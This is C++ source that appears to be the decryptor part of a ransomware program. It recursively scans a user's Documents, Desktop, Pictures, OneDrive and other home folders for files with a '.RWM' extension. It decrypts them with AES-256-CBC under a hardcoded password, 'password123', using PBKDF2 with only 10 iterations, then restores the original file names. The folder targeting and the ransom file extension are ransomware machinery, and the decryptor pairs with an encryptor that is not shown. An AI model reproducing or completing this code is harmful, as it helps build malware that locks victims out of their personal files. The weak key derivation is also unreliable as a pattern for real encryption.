#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <string>
#include <cstring>
#include <openssl/evp.h>
#include <openssl/kdf.h>
#include <openssl/err.h>


namespace fs = std::filesystem;

const std::string password_key = "password123";
const std::string extension = ".RWM";

const std::vector<std::string> Folders = {
    "Documents",
    "Downloads",
    "Favorites",
    "Links",
    "Music",
    "Pictures",
    "Saved Games",
    "Videos",
    "OneDrive",
    "Desktop"
};

// Read entire file into byte vector
std::vector<unsigned char> readFile(const std::string& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file) throw std::runtime_error("Cannot open file: " + path);
    
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<unsigned char> buffer(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        throw std::runtime_error("Read failed: " + path);
    }
    return buffer;
}

// Write byte vector to file
void writeFile(const std::string& path, const std::vector<unsigned char>& data) {
    std::ofstream file(path, std::ios::binary);
    if (!file) throw std::runtime_error("Cannot create file: " + path);
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
}

// Decrypt file using AES-256-CBC with PBKDF2 key derivation
std::string decryptFile(const std::string& password, const std::string& filePath) {
    // Read encrypted file
    std::vector<unsigned char> encrypted_data = readFile(filePath);
    
    if (encrypted_data.size() < 32) {
        throw std::runtime_error("File too small to contain salt and IV");
    }

    // Extract salt (16 bytes) and IV (16 bytes)
    std::vector<unsigned char> salt(encrypted_data.begin(), encrypted_data.begin() + 16);
    std::vector<unsigned char> iv(encrypted_data.begin() + 16, encrypted_data.begin() + 32);
    std::vector<unsigned char> ciphertext(encrypted_data.begin() + 32, encrypted_data.end());

    // Derive key using PBKDF2
    std::vector<unsigned char> key(32);
    if (PKCS5_PBKDF2_HMAC(
        password.c_str(), password.size(),
        salt.data(), salt.size(),
        10,  // iterations
        EVP_sha1(),
        key.size(), key.data()) != 1
    ) {
        throw std::runtime_error("Key derivation failed");
    }

    // Initialize decryption context
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) throw std::runtime_error("Context creation failed");
    
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key.data(), iv.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Decryption init failed");
    }

    // Decrypt data
    std::vector<unsigned char> plaintext(ciphertext.size() + EVP_CIPHER_CTX_block_size(ctx));
    int out_len1 = 0, out_len2 = 0;
    
    if (EVP_DecryptUpdate(ctx, plaintext.data(), &out_len1, ciphertext.data(), ciphertext.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Decryption update failed");
    }
    
    if (EVP_DecryptFinal_ex(ctx, plaintext.data() + out_len1, &out_len2) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Decryption finalize failed - bad password or corrupted file");
    }
    
    EVP_CIPHER_CTX_free(ctx);
    plaintext.resize(out_len1 + out_len2);

    // Write decrypted data back to original file
    writeFile(filePath, plaintext);

    // Remove extension from filename
    if (filePath.size() > extension.size() && 
        filePath.substr(filePath.size() - extension.size()) == extension) {
        std::string newPath = filePath.substr(0, filePath.size() - extension.size());
        fs::rename(filePath, newPath);
        return newPath;
    }
    return filePath;
}

void startDecrypting() {
    // Get user's home directory
    const char* homeDir = nullptr;
    #ifdef _WIN32
        homeDir = std::getenv("USERPROFILE");
    #else
        homeDir = std::getenv("HOME");
    #endif
    
    if (!homeDir) {
        std::cerr << "ERROR: Could not find home directory" << std::endl;
        return;
    }

    for (const auto& folder : Folders) {
        fs::path fullPath = fs::path(homeDir) / folder;
        
        if (!fs::exists(fullPath)) {
            continue;
        }
        
        try {
            for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
                if (!entry.is_regular_file()) continue;
                
                std::string path_str = entry.path().string();
                // Check if file ends with our extension
                if (path_str.size() > extension.size() && 
                    path_str.substr(path_str.size() - extension.size()) == extension) {
                    try {
                        std::string new_path = decryptFile(password_key, path_str);
                        std::cout << "SUCCESS: File Decrypted: " << new_path << std::endl;
                    } catch (const std::exception& e) {
                        std::cerr << "ERROR: " << e.what() << " - " << path_str << std::endl;
                    }
                }
            }
        } catch (const fs::filesystem_error& e) {
            std::cerr << "WARNING: " << e.what() << std::endl;
        }
    }
}

int main() {
    // Initialize OpenSSL
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    
    std::cout << "---------------------------" << std::endl;
    startDecrypting();
    std::cout << "---------------------------" << std::endl;
    
    // Cleanup OpenSSL
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}
